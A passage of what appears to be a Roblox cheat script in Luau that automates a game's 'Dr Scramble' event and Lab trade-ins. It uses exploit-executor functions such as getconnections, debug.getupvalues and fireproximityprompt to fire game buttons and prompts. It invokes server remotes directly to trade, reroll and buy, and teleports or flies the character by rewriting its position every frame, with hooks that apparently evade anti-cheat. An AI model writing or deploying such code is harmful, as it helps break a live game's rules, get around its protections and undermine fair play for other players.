local str2 = ""
local flag2 = false
local function fn9(arg, arg2)
local v12 = networking:FindFirstChild(arg)
if not v12 or not v12:IsA("RemoteFunction") then
return false, nil, nil
end
if arg2 == nil then
return pcall(v12.InvokeServer, v12)
end
return pcall(v12.InvokeServer, v12, arg2)
end
local function fn10()
local save2 = tbl.Save
if type(save2) ~= "table" or type(save2.Get) ~= "function" then
return nil
end
local ok, result = pcall(save2.Get)
return ok and type(result) == "table" and result or nil
end
local function fn11(arg)
local directory = tbl.Assets and tbl.Assets.Directory
local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
return tostring(type(flag3) == "table" and flag3.DisplayName or arg)
end
local function fn12(arg)
if not arg and type(v11) == "table" and os.clock() < n9 then
return v11
end
n9 = os.clock() + n6
local AskState, v12 = fn9("RF/ScrambleTradeIn/AskState")
if AskState and type(v12) == "table" then
v11 = v12
n10 = os.clock()
end
return v11
end
local function fn13()
local tbl22 = {}
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if ok and type(result) == "table" then
for k, v12 in pairs(result) do
if type(v12) == "table" and v12.Placement ~= nil then
tbl22[k] = true
end
end
end
end
return tbl22
end
local function fn14(arg, arg2)
local requirements = type(arg) == "table" and arg.Requirements or nil
if type(requirements) ~= "table" or #requirements == 0 then
return nil, "No active recipe", {}
end
local v12 = fn13()
local tbl22 = {}
local tbl23 = {}
for _, requirement in ipairs(requirements) do
tbl22[tostring(requirement)] = {}
end
local v13 = pairs
local eggInventory = arg2.EggInventory or {}
for k, v14 in v13(eggInventory) do
local str3 = type(v14) == "table" and tostring(v14.AssetCategory) or nil
local v15 = str3 and tbl22[str3] or nil
if v15 then
if v12[k] then
tbl23[str3] = true
else
local flag3 = v14.BaseMutation ~= nil and v14.BaseMutation ~= "Normal" or type(v14.Mutations) == "table" and next(v14.Mutations) ~= nil
table.insert(v15, { Uid = k, Scale = tonumber(v14.AssetScale) or 0, Mutated = flag3 })
end
end
end
for _, v14 in pairs(tbl22) do
table.sort(v14, function(arg3, arg4)
if arg3.Mutated ~= arg4.Mutated then
return arg4.Mutated
end
return arg3.Scale < arg4.Scale
end)
end
local tbl24 = {}
local tbl25 = {}
local tbl26 = {}
local str3 = nil
for i, requirement in ipairs(requirements) do
local tbl27 = tbl22[tostring(requirement)]
local v14 = ipairs
tbl27 = tbl27 or {}
local v15 = nil
for _, v16 in v14(tbl27) do
if not tbl25[v16.Uid] then
v15 = v16
break
else
v15 = nil
end
end
if v15 then
tbl25[v15.Uid] = true
tbl26[i] = v15.Uid
table.insert(tbl24, v15.Uid)
elseif not str3 then
if tbl23[tostring(requirement)] then
str3 = "Need a " .. fn11(requirement) .. " egg, yours is placed on a nest"
else
str3 = "Need a " .. fn11(requirement) .. " egg"
end
end
end
if str3 then
return nil, str3, tbl25, tbl26
end
return tbl24, nil, tbl25, tbl26
end
local tbl22 = {}
local function fn15()
local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
playerGui = playerGui and playerGui:FindFirstChild("DrScrambleTradeIn")
local drScrambleTradeInMain = playerGui and playerGui:FindFirstChild("DrScrambleTradeInMain")
playerGui = playerGui and playerGui:FindFirstChild("DrScrambleTradeInInventory", true)
local sacrificeInputs = drScrambleTradeInMain and drScrambleTradeInMain:FindFirstChild("SacrificeInputs")
if not drScrambleTradeInMain or not playerGui or not sacrificeInputs then
return nil
end
return { Main = drScrambleTradeInMain, Inventory = playerGui, Inputs = sacrificeInputs }
end
local function fn16(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("GuiButton") then
return false
end
local ok, result = pcall(getconnections, arg.Activated)
if not ok or type(result) ~= "table" or #result == 0 then
return false
end
local flag3 = false
for _, v12 in ipairs(result) do
local ok2, result2 = pcall(function()
return v12.Function
end)
local flag4 = ok2 and type(result2) == "function"
local v13 = nil
if flag4 then
local ok3, result3 = pcall(debug.getupvalues, result2)
ok3 = ok3 and type(result3) == "table"
v13 = nil
if ok3 then
v13 = nil
for i = 1, #result3 do
if type(result3[i]) == "function" then
v13 = result3[i]
break
else
v13 = nil
end
end
end
end
if v13 then
flag3 = pcall(v13) or flag3
else
flag3 = pcall(function()
v12:Fire()
end) or flag3
end
end
return flag3
end
local function fn17(arg)
local full = arg and arg:FindFirstChild("Full")
return full ~= nil and full.Visible == true
end
local function fn18(arg, arg2)
for i = 1, arg2 do
if not fn17(arg.Inputs:FindFirstChild("Input" .. i)) then
return false
end
end
return arg2 > 0
end
local function fn19(arg, arg2)
local v12 = fn15()
local requirements = type(arg) == "table" and arg.Requirements or nil
if not v12 or type(requirements) ~= "table" then
return false
end
for i = 1, #requirements do
local v13 = v12.Inputs:FindFirstChild("Input" .. i)
local v14 = arg2[i]
local flag3 = v13 and v14 and not fn17(v13)
if flag3 then
flag3 = (tbl22[v14] or 0) <= os.clock()
end
if flag3 then
local empty = v13:FindFirstChild("Empty")
if fn16(empty and empty:FindFirstChild("Add")) then
local scrollingFrame = v12.Inventory:FindFirstChild("ScrollingFrame")
local n11 = 0
local v15 = nil
while n11 < 2 do
v15 = scrollingFrame and scrollingFrame:FindFirstChild("Egg_" .. v14)
if not v15 then
n11 += task.wait(0.1)
continue
end
break
end
if v15 then
fn16(v15)
end
local n12 = 0
while n12 < 2 and not fn17(v13) do
n12 += task.wait(0.1)
end
if v12.Inventory.Visible then
if not fn16(v12.Inventory:FindFirstChild("Close")) then
v12.Inventory.Visible = false
end
end
end
if not fn17(v13) then
tbl22[v14] = os.clock() + 30
end
end
end
return fn18(v12, #requirements)
end
local function fn20()
local v12 = v11
if type(v12) ~= "table" then
return "Lab status unknown"
end
if v12.Unlocked ~= true then
return "Lab is locked on this account"
end
local tbl23 = {}
local v13 = ipairs
local requirements = v12.Requirements or {}
for _, requirement in v13(requirements) do
table.insert(tbl23, fn11(requirement))
end
local n11 = (tonumber(v12.SecondsUntilRotation) or 0) - os.clock() - n10
if n11 < 0 then
n11 = 0
end
local str3 = string.format("%s  -  needs %s  -  pity %s/%s  -  free rerolls %s  -  rotates in %d:%02d", tostring(v12.BannerDisplayName or v12.BannerId or "Lab"), #tbl23 > 0 and table.concat(tbl23, ", ") or "unknown", tostring(v12.PityCount or 0), tostring(v12.PityThreshold or 0), tostring(v12.FreeRefreshesRemaining or 0), math.floor(n11 / 60), math.floor(n11 % 60))
if str2 ~= "" then
str3 ..= "  -  " .. str2
end
return str3
end
local function fn21(arg)
local v12 = fn12(true)
if type(v12) ~= "table" or v12.Unlocked ~= true then
return
end
if v12.PendingReward ~= nil and v12.PendingReward ~= false then
local AskFinishReveal, v13 = fn9("RF/ScrambleTradeIn/AskFinishReveal")
str2 = AskFinishReveal and v13 ~= false and "Reward claimed" or "Reward claim failed"
n9 = 0
return
end
if not tbl4.Lab.BannerOk(v12.BannerId) then
tbl4.Lab.Reserved = {}
str2 = "Waiting for " .. tbl4.Lab.PickedText()
return
end
local v13 = fn10()
if not v13 then
return
end
local v14, v15, v16, v17 = fn14(v12, v13)
local flag3 = tbl4.Toggle(v9, false)
tbl4.Lab.Reserved = flag3 and v16 or {}
flag3 = flag3 and arg == n7
local flag4 = false
if flag3 then
local result
flag4, result = pcall(fn19, v12, v17 or {})
flag4 = flag4 and result == true
end
if not v14 then
str2 = v15 or "Recipe not ready"
local flag5 = arg == n7 and tbl4.Toggle(v10, false)
if flag5 then
flag5 = (tonumber(v12.FreeRefreshesRemaining) or 0) > 0
end
if flag5 then
local AskRefresh, v18, v19 = fn9("RF/ScrambleTradeIn/AskRefresh")
if AskRefresh and v18 ~= false then
str2 = "Recipe rerolled"
else
str2 = tostring(v19 or "Reroll rejected")
end
n9 = 0
end
return
end
if not tbl4.Toggle(v9, false) then
str2 = "Ready to trade in"
return
end
if arg ~= n7 then
return
end
if flag4 then
local v18 = fn15()
if v18 and fn16(v18.Main:FindFirstChild("Sacrifice", true)) then
str2 = "Trade-in sent"
n9 = 0
return
end
end
local AskTradeIn, v18, v19 = fn9("RF/ScrambleTradeIn/AskTradeIn", v14)
if AskTradeIn and v18 ~= false then
str2 = "Trade-in sent"
else
str2 = tostring(v19 or "Trade rejected")
end
n9 = 0
end
local v12 = v7:CreateText({ Name = "Lab Status", Text = "Loading Lab data..." })
local tbl23 = {}
local tbl24 = {}
for _, v13 in ipairs(tbl4.Lab.BannerList()) do
table.insert(tbl23, v13.Name)
tbl24[v13.Name] = v13.Id
end
fn6(v7:CreateMultiDropdown({
Name = "Lab Banners",
Note = "Only trade and steal for these banners (empty = all)",
Options = tbl23,
Default = {},
Callback = function(arg)
local banners = {}
if type(arg) == "table" then
for k, v13 in pairs(arg) do
k = v13 == true and type(k) == "string" and k or type(v13) == "string" and v13 or nil
if k and tbl24[k] then
banners[tbl24[k]] = true
end
end
end
tbl4.Lab.Banners = banners
str2 = ""
n8 = 0
n9 = 0
tbl4.Rift.Next = 0
if type(tbl4.Lab.ForceSteal) == "function" then
pcall(tbl4.Lab.ForceSteal)
end
tbl3.Wake()
end,
}))
v9 = v7:CreateToggle({
Name = "Auto Lab Trade-In",
Default = false,
Callback = function()
if not tbl4.Toggle(v9, false) then
tbl4.Lab.Reserved = {}
end
n7 += 1
str2 = ""
n8 = 0
n9 = 0
tbl3.Wake()
end,
})
v10 = v7:CreateToggle({
Name = "Auto Reroll Lab Recipe",
Default = false,
Callback = function()
n7 += 1
str2 = ""
n8 = 0
n9 = 0
tbl3.Wake()
end,
})
tbl4.Lab.PlaceHandle = v7:CreateToggle({
Name = "Auto Place Lab Reward Eggs",
Note = "Places the reward eggs from Lab trades",
Default = false,
Callback = function(arg)
if type(arg) ~= "boolean" then
arg = tbl4.Toggle(tbl4.Lab.PlaceHandle, false)
end
tbl4.Lab.PlaceOn = arg == true
if type(tbl4.PlaceEggRefresh) == "function" then
pcall(tbl4.PlaceEggRefresh)
end
tbl3.Wake()
end,
})
tbl3.Add(function()
local v13 = tbl4.Toggle(v9, false)
local v14 = tbl4.Toggle(v10, false)
local n11 = (v13 or v14) and 1 or 30
if not flag2 and (v11 == nil or n9 == 0 or os.clock() - n10 >= n11) then
flag2 = true
task.spawn(function()
pcall(fn12, true)
flag2 = false
end)
end
if v12 and type(v12.Set) == "function" then
pcall(v12.Set, v12, fn20())
end
local v15 = flag
local flag3
if flag then
flag3 = v15
else
flag3 = not (v13 or v14)
end
if flag3 or os.clock() < n8 then
return false
end
flag = true
n8 = os.clock() + n5
local v16 = n7
task.spawn(function()
pcall(fn21, v16)
flag = false
tbl3.Wake()
end)
return false
end)
end
local n5
n5 = 6
local n6
n6 = 1.5
local n7
n7 = 400
local tbl22, tbl23, tbl24, tbl25, tbl26, tbl27, snapshot, n8, flag, n9
local n10, str2, str3, tbl28, n11, flag2, tbl29, tbl30, flag3, n12
local v9, scrambleRequest, scrambleRead, fn9, fn10, fn11, fn12, fn13, fn14, fn15
local fn16, fn17, fn18, fn19, fn20
do
local vector = Vector3.new(2120, -120, -355)
tbl22 = { "LostPart1", "LostPart2" }
tbl23 = {
{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
{ Label = "2x Cash Booster", Id = "CashBooster" },
{ Label = "1.25x Speed", Id = "SpeedBoost" },
{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
}
tbl24 = {}
for _, v10 in ipairs(tbl23) do
tbl24[#tbl24 + 1] = v10.Label
end
tbl25 = {}
tbl26 = {}
tbl27 = { Keep = 0, Handle = nil, Picked = { ["Scrambled Mutation"] = true } }
snapshot = nil
n8 = -math.huge
flag = false
n9 = 0
n10 = 0
str2 = ""
str3 = ""
tbl28 = { Tool = nil, EquipAt = 0 }
n11 = 16
flag2 = false
tbl29 = { Index = 1, Since = 0, Tool = nil }
tbl30 = { Latch = false, Ended = false }
flag3 = false
n12 = 0
v9 = nil
local function fn21()
local packages = ReplicatedStorage:FindFirstChild("Packages")
packages = packages and packages:FindFirstChild("Networking")
packages = packages and packages:FindFirstChild("RF/Scramble/Request")
if packages and packages:IsA("RemoteFunction") then
return packages
end
return nil
end
scrambleRequest = function(arg, ...)
local v10 = fn21()
if not v10 then
return nil
end
local v11 = table.pack(...)
local ok, result = pcall(function()
return v10:InvokeServer(arg, table.unpack(v11, 1, v11.n))
end)
if not ok or type(result) ~= "table" then
return nil
end
if type(result.Snapshot) == "table" then
snapshot = result.Snapshot
n8 = os.clock()
elseif arg == "Snapshot" and type(result.State) == "table" then
snapshot = result
n8 = os.clock()
end
return result
end
scrambleRead = function(arg)
if arg or snapshot == nil or os.clock() - n8 >= n5 then
scrambleRequest("Snapshot")
end
return snapshot
end
tbl4.ScrambleRead = scrambleRead
tbl4.ScrambleRequest = scrambleRequest
tbl4.ScrambleSnapshot = function()
return snapshot
end
fn9 = function()
local v10 = snapshot
return type(v10) == "table" and type(v10.State) == "table" and v10.State or nil
end
fn10 = function()
local v10 = snapshot
if type(v10) ~= "table" or v10.Enabled == false or type(v10.State) ~= "table" then
return false
end
local num = tonumber(v10.EventEndsAt)
return num == nil or workspace:GetServerTimeNow() < num
end
fn11 = function()
local v10 = snapshot
local window = type(v10) == "table" and v10.Window or nil
if type(window) ~= "table" then
return false, nil
end
local serverTimeNow = workspace:GetServerTimeNow()
local num = tonumber(window.StartsAt)
local num2 = tonumber(window.EndsAt)
local flag4 = window.Active == true
local flag5
if flag4 then
flag5 = flag4
else
flag5 = num and num2 and serverTimeNow >= num and serverTimeNow < num2
end
if flag5 then
return true, num2 and math.max(0, num2 - serverTimeNow) or nil
end
local num3 = tonumber(window.NextAt)
return false, num3 and math.max(0, num3 - serverTimeNow) or nil
end
fn12 = function(arg, arg2)
local lostParts = type(arg) == "table" and arg.LostParts or nil
if type(lostParts) ~= "table" then
return false
end
if lostParts[arg2] then
return true
end
for _, lostPart in pairs(lostParts) do
if lostPart == arg2 then
return true
end
end
return false
end
fn13 = function(arg)
local n13 = 0
for _, v10 in ipairs(tbl22) do
if fn12(arg, v10) then
n13 += 1
end
end
return n13
end
local function fn22(arg)
local n13 = math.max(0, math.floor(tonumber(arg) or 0))
if n13 >= 3600 then
return string.format("%dh %dm", n13 // 3600, n13 % 3600 // 60)
end
return string.format("%dm %ds", n13 // 60, n13 % 60)
end
fn14 = function()
local v10 = fn9()
if not v10 then
return "Dr Scramble event is not running"
end
if not fn10() then
return "Dr Scramble event has ended"
end
local v11, v12 = fn11()
local str4
if v11 then
str4 = "Outbreak live " .. fn22(v12 or 0)
else
str4 = v11
end
str4 = str4 or v12 and "Outbreak in " .. fn22(v12) or "Outbreak soon"
local str5 = v10.Completed == true and "Vault claimed"
if not str5 then
str5 = string.format("Lost %d/2  Drone %d/3", fn13(v10), math.min(3, tonumber(v10.DroneParts) or 0))
end
if v11 then
local n13 = 0
for _, v13 in pairs(tbl25) do
if (tonumber(v13.Health) or 0) > 0 then
n13 += 1
end
end
str4 ..= string.format("  %d drones", n13)
end
local str6 = string.format("Samples %d  -  %s  -  %s", tonumber(v10.Samples) or 0, str5, str4)
if str3 ~= "" and tbl4.Toggle(nil, false) then
str6 ..= "  -  " .. str3
end
if str2 ~= "" then
str6 ..= "  -  " .. str2
end
return str6
end
fn15 = function()
return tbl4.Root()
end
fn16 = function(arg, arg2, arg3, arg4)
local n13 = arg4 or 400
local v10 = fn15()
if not v10 then
return false
end
arg3 = arg3 or 1
if (v10.Position - arg).Magnitude <= arg3 then
return true
end
tbl4.Shield("scramble", true)
local n14 = os.clock() + 6
while not tbl4.Swapped() and os.clock() < n14 and not arg2() do
str2 = "Waiting for the character to settle"
RunService.Heartbeat:Wait()
end
local v11 = fn15() or v10
local character = localPlayer.Character
tbl4.Driving = tbl4.Driving + 1
local position = v11.Position
local flag4 = nil
local n15 = (arg - position).Magnitude / n13 + 3
local n16 = 0
local connection = RunService.Heartbeat:Connect(function(deltaTime)
if flag4 ~= nil or tbl4.AntiGuard.Busy then
return
end
n16 += deltaTime
local v12 = fn15()
if not v12 or arg2() or n16 > n15 or localPlayer.Character ~= character then
flag4 = false
return
end
if (v12.Position - position).Magnitude > 8 then
position = v12.Position
end
local n17 = arg - position
local n18 = n13 * deltaTime
local flag5 = n17.Magnitude <= math.max(n18, arg3)
position = flag5 and arg or position + n17.Unit * n18
local vector2 = Vector3.new(n17.X, 0, n17.Z)
local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v12.CFrame.Rotation
pcall(function()
v12.CFrame = CFrame.new(position) * cframe
v12.AssemblyLinearVelocity = Vector3.zero
v12.AssemblyAngularVelocity = Vector3.zero
end)
if flag5 then
flag4 = true
end
end)
while flag4 == nil do
RunService.Heartbeat:Wait()
end
connection:Disconnect()
tbl4.Driving = math.max(0, tbl4.Driving - 1)
tbl4.Shield("scramble", false)
return flag4
end
fn17 = function(arg)
if typeof(arg) ~= "Instance" or not arg:IsA("ProximityPrompt") then
return false
end
local ok = pcall(function()
arg:InputHoldBegin()
local n13 = tonumber(type(tbl4.PromptHold) == "function" and tbl4.PromptHold(arg) or arg.HoldDuration) or 0
if n13 > 0 then
task.wait(n13 + 0.2)
end
arg:InputHoldEnd()
end)
if not ok and type(fireproximityprompt) == "function" then
ok = pcall(fireproximityprompt, arg)
end
return ok
end
local function fn23()
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("SecretZones")
return world and world:FindFirstChild("Cave") or nil
end
fn18 = function(arg)
local teleporter = fn23()
teleporter = teleporter and teleporter:FindFirstChild("Teleporter")
teleporter = teleporter and teleporter:FindFirstChild(arg)
teleporter = teleporter and teleporter:FindFirstChild("SecretZonePrompt", true)
return teleporter and teleporter:IsA("ProximityPrompt") and teleporter or nil
end
fn19 = function(arg, arg2)
arg = arg and arg.Parent
if arg and arg:IsA("Attachment") then
return arg.WorldPosition
end
if arg and arg:IsA("BasePart") then
return arg.Position
end
return arg2
end
fn20 = function()
local v10 = fn15()
if not v10 then
return false
end
local position = v10.Position
local vector2 = Vector3.new(position.X - vector.X, 0, position.Z - vector.Z)
return position.Y < -60 and vector2.Magnitude < 160
end
end
local fn21
local function fn22()
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
local areas = world and world:FindFirstChild("Areas")
areas = areas and areas:FindFirstChild("SeparationLine")
return areas and areas:IsA("BasePart") and areas.Position.X or 552
end
fn21 = function(arg)
if not arg then
arg = fn15()
arg = arg and arg.Position
end
return arg ~= nil and arg.X < fn22()
end
local connection = localPlayer.CharacterAdded:Connect(function()
tbl4.ScrambleRespawned = true
tbl28.Tool = nil
tbl28.EquipAt = 0
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
local fn23
fn23 = function(arg, arg2)
if not fn21() then
tbl4.ScrambleRespawned = false
return true
end
if arg2 and fn21(arg2) then
return true
end
local function fn24()
str2 = "Respawned, resting in the safe zone"
local n13 = os.clock() + 0.75
while os.clock() < n13 do
if arg() then
return false
end
task.wait(0.1)
end
tbl4.ScrambleRespawned = false
return true
end
local flag4 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
if not flag4 then
tbl4.ScrambleRespawned = false
return true
end
local flag5 = tbl4.ScrambleRespawned == true
if tbl4.DistanceTo(flag4) <= 12 then
if flag5 then
return (fn24())
end
return true
end
str2 = flag5 and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
local v10 = fn16
local v11 = v10(flag4 + Vector3.new(0, 3, 0), arg, 3, flag5 and math.min(400, 300) or nil)
if v11 and flag5 then
return (fn24())
end
return v11
end
local fn24, fn25
do
local function fn26(arg, arg2, arg3)
local v10 = fn15()
if not v10 then
return false
end
tbl4.Shield("scramblefly", true)
local position = v10.Position
local flag4 = true
if Vector3.new(arg.X - position.X, 0, arg.Z - position.Z).Magnitude > 250 then
local n13 = math.max(position.Y, arg.Y, 98)
flag4 = fn16(Vector3.new(position.X, n13, position.Z), arg2, 2) and fn16(Vector3.new(arg.X, n13, arg.Z), arg2, 2)
end
flag4 = flag4 and fn16(arg, arg2, math.min(arg3, 2))
tbl4.Shield("scramblefly", false)
return flag4
end
local function fn27()
local flag4 = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
return flag4 and flag4 + Vector3.new(0, 3, 0) or nil
end
fn24 = function(arg, arg2, arg3)
local n13 = arg3 or 6
if tbl4.DistanceTo(arg) <= n13 then
return true
end
local v10 = fn21()
local v11 = fn21(arg)
if v10 and not v11 then
if not fn23(arg2, arg) then
return false
end
elseif v11 and not v10 then
local v12 = fn27()
if v12 and (v12 - arg).Magnitude > 12 and tbl4.DistanceTo(v12) > 12 then
str2 = "Coming back through the safe zone"
if not fn26(v12, arg2, 3) then
return false
end
end
end
return fn26(arg, arg2, n13)
end
fn25 = function(arg)
if fn21() or arg() or tbl4.IsNight() or tbl4.WallSealed() then
return
end
local v10 = fn27()
if v10 then
str2 = "Coming back through the safe zone"
fn24(v10, arg, 4)
end
end
end
local fn26, fn27, fn28
do
local function fn29(arg)
if fn20() then
return true
end
local Entry = fn18("Entry")
local v10 = fn19(Entry, Vector3.new(2125.7, 73.1, -295.4))
str2 = "Flying to the Secret Cave"
if not fn24(v10, arg, 6) then
return false
end
for i = 1, 4 do
if arg() then
return false
end
str2 = "Entering the Secret Cave"
fn17(Entry or fn18("Entry"))
local n13 = os.clock() + 1.5
while os.clock() < n13 and not fn20() do
RunService.Heartbeat:Wait()
end
if fn20() then
return true
end
end
str2 = "Cave door missed, flying in"
local quest = type(snapshot) == "table" and snapshot.Quest or nil
local position = type(quest) == "table" and type(quest.EscapedExperiment) == "table" and quest.EscapedExperiment.Position or nil
if typeof(position) == "Vector3" then
pcall(tbl4.FlyTo, position, arg, "scramble")
end
return fn20()
end
local function fn30(arg)
local quest = type(snapshot) == "table" and snapshot.Quest or nil
local flag4 = type(quest) == "table" and quest[arg] or nil
local position = type(flag4) == "table" and flag4.Position or nil
if typeof(position) == "Vector3" then
return position
end
local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
local v10 = drScrambleEvent and drScrambleEvent:FindFirstChild(arg)
if v10 and v10:IsA("Model") then
return v10:GetPivot().Position
end
return nil
end
local function fn31(arg)
local v10 = snapshot
local interactions = type(v10) == "table" and v10.Interactions or nil
return math.max(4, (type(interactions) == "table" and tonumber(interactions[arg]) or 12) - 4)
end
fn26 = function(arg)
local v10 = fn9()
if not v10 or v10.Discovered == true then
return true
end
local EscapedExperiment = fn30("EscapedExperiment")
if not EscapedExperiment or not fn29(arg) then
return false
end
str2 = "Talking to the Escaped Experiment"
if not fn16(EscapedExperiment, arg, fn31("NpcRadius")) then
return false
end
local Discover = scrambleRequest("Discover")
scrambleRead(true)
return Discover ~= nil and fn9() ~= nil and fn9().Discovered == true
end
fn27 = function(arg)
local v10 = fn9()
local flag4 = not v10 or v10.Completed == true
if not flag4 then
local n13 = #tbl22
flag4 = fn13(v10) >= n13
end
if flag4 then
return
end
if v10.Discovered ~= true and not fn26(arg) then
return
end
for _, v11 in ipairs(tbl22) do
if arg() then
return
end
if not fn12(fn9(), v11) then
local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(v11)
drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild("Hitbox", true)
local claimLostPart = drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
local position = drScrambleEvent and drScrambleEvent:IsA("BasePart") and drScrambleEvent.Position or fn30(v11)
if position then
str2 = "Flying to " .. (v11 == "LostPart1" and "Lost Part 1" or "Lost Part 2")
if fn24(position + Vector3.new(0, 2, 0), arg, 3) then
str2 = "Collecting the lost part"
local n13 = position + Vector3.new(0, 2.5, 0)
local character = localPlayer.Character
tbl4.Shield("scramble", true)
tbl4.Driving = tbl4.Driving + 1
local connection2 = RunService.Heartbeat:Connect(function()
local v12 = tbl4.Root()
if not v12 or v12.Parent ~= character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
return
end
pcall(function()
local rotation = v12.CFrame.Rotation
v12.CFrame = CFrame.new(n13) * rotation
v12.AssemblyLinearVelocity = Vector3.zero
v12.AssemblyAngularVelocity = Vector3.zero
end)
end)
for i = 1, 4 do
if not arg() then
claimLostPart = claimLostPart or drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
fn17(claimLostPart)
task.wait(0.6)
scrambleRead(true)
if not fn12(fn9(), v11) then
continue
end
end
break
end
connection2:Disconnect()
tbl4.Driving = math.max(0, tbl4.Driving - 1)
tbl4.Shield("scramble", false)
if arg() then
return
end
continue
end
end
end
end
end
fn28 = function(arg)
local v10 = fn9()
if not v10 or v10.Completed == true then
return
end
local num = tonumber(v10.TotalParts)
if not num then
num = fn13(v10) + (tonumber(v10.DroneParts) or 0)
end
if num < 5 then
return
end
local ExperimentVault = fn30("ExperimentVault")
if not ExperimentVault or not fn29(arg) then
return
end
str2 = "Opening the Experiment Vault"
if not fn16(ExperimentVault, arg, fn31("VaultRadius")) then
return
end
scrambleRequest("Vault")
scrambleRead(true)
local v11 = fn9()
if v11 and v11.Completed == true then
str2 = "Vault opened, The Scrambler unlocked"
end
end
end
local fn29
fn29 = function()
local function fn30(arg)
if not arg or not arg:IsA("Tool") then
return false
end
if tostring(arg:GetAttribute("ItemType")) ~= "MutationConsumable" then
return false
end
local attribute = arg:GetAttribute("MutationId") or arg:GetAttribute("MutationTemplate")
if attribute ~= nil then
return tostring(attribute) == "Scrambled"
end
return string.find(string.lower(arg.Name), "scrambled", 1, true) ~= nil
end
local character = localPlayer.Character
if character then
for _, child in ipairs(character:GetChildren()) do
if fn30(child) then
return child, true
end
end
end
local backpack = localPlayer:FindFirstChildOfClass("Backpack")
if backpack then
for _, child in ipairs(backpack:GetChildren()) do
if fn30(child) then
return child, false
end
end
end
return nil, false
end
local fn30
fn30 = function(arg, arg2)
local shopPurchases = type(arg) == "table" and arg.ShopPurchases or nil
local flag4 = type(shopPurchases) == "table" and shopPurchases[arg2.Id] or nil
if type(flag4) ~= "table" then
return 0
end
local shopPeriod = type(snapshot) == "table" and snapshot.ShopPeriod or nil
if flag4.Period ~= nil and shopPeriod ~= nil and flag4.Period ~= shopPeriod then
return 0
end
return tonumber(flag4.Count) or 0
end
local fn31
fn31 = function(arg)
local v10 = scrambleRead(true)
if type(v10) ~= "table" or type(v10.Shop) ~= "table" then
return
end
for _, v11 in ipairs(tbl23) do
if arg() then
return
end
if tbl27.Picked[v11.Label] == true then
for i = 1, 10 do
local v12 = snapshot
local v13 = fn9()
local v14 = ipairs
local shop = type(v12) == "table" and v12.Shop or {}
local v15 = nil
for _, v16 in v14(shop) do
if type(v16) == "table" and v16.Id == v11.Id then
v15 = v16
end
end
if not (not v15 or not v13 or arg()) then
local num = tonumber(v15.PurchaseLimit)
if not (num and fn30(v13, v15) >= num) then
if not ((tonumber(v13.Samples) or 0) - (tonumber(v15.Price) or math.huge) < tbl27.Keep) then
local Shop = scrambleRequest("Shop", v15.Id, { Quote = v15.Quote, Sequence = tonumber(v13.ShopSequence) or 0 })
if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
str2 = "Bought " .. v11.Label
task.wait(0.4)
continue
end
end
end
end
break
end
end
end
end
local n13, n14, n15, tbl31, tbl32, v10, n16, n17, n18, n19
local fn32, fn33, v11, fn34, fn35, fn36, fn37
do
local n20 = 98
n13 = 12
n14 = 20
n15 = 3
tbl31 = {
Vector3.new(2000, 90, -360),
Vector3.new(2700, 90, -370),
Vector3.new(3400, 90, -365),
Vector3.new(4100, 90, -360),
Vector3.new(4800, 90, -370),
Vector3.new(5500, 90, -360),
Vector3.new(5900, 90, -365),
}
tbl32 = {}
local tbl33 = { Link = nil, Goal = nil, Look = nil, Character = nil }
local userId = localPlayer.UserId
local tbl34 = {}
for _, v12 in ipairs({
{ Label = "Scrap Drone", Tier = "ScrapDrone" },
{ Label = "Reactor Drone", Tier = "ReactorDrone" },
{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
}) do
tbl34[#tbl34 + 1] = v12.Label
end
local tbl35 = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
local v12 = ({ "Nearest", "Rare First", "Most HP First" })[1]
v10 = ({ "Tween", "Teleport" })[1]
n16 = 110
n17 = 1.5
n18 = 0
n19 = -math.huge
local function fn38(arg)
local num = type(arg) == "table" and tonumber(arg.OwnerUserId) or nil
return num == nil or num == userId
end
local function fn39(arg)
if typeof(arg) == "CFrame" then
return arg.Position
end
if typeof(arg) == "Vector3" then
return arg
end
return nil
end
local function fn40(arg, arg2)
local v13 = networking:FindFirstChild(arg)
if not v13 or not v13:IsA("RemoteEvent") then
return
end
local connection2 = v13.OnClientEvent:Connect(function(...)
pcall(arg2, ...)
end)
fn4(function()
pcall(function()
connection2:Disconnect()
end)
end)
end
fn40("RE/Scramble/Drones", function(arg)
if type(arg) ~= "table" then
return
end
local v13 = pairs
local upserts = type(arg.Upserts) == "table" and arg.Upserts or {}
for _, upsert in v13(upserts) do
if type(upsert) == "table" and upsert.Id ~= nil and fn38(upsert) then
local id = tostring(upsert.Id)
local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
local tbl36 = tbl25[id] or {}
tbl36.Id = id
tbl36.Position = fn39(upsert.CFrame) or tbl36.Position
tbl36.Health = tonumber(upsert.Health) or tbl36.Health or 1
tbl36.Tier = tostring(attributes.ScrambleTier or tbl36.Tier or "")
tbl36.Area = tostring(attributes.ScrambleArea or tbl36.Area or "")
tbl36.Seen = os.clock()
tbl25[id] = tbl36
end
end
local v14 = pairs
local removed = type(arg.Removed) == "table" and arg.Removed or {}
for k, v15 in v14(removed) do
tbl25[tostring(type(v15) == "string" and v15 or k)] = nil
end
end)
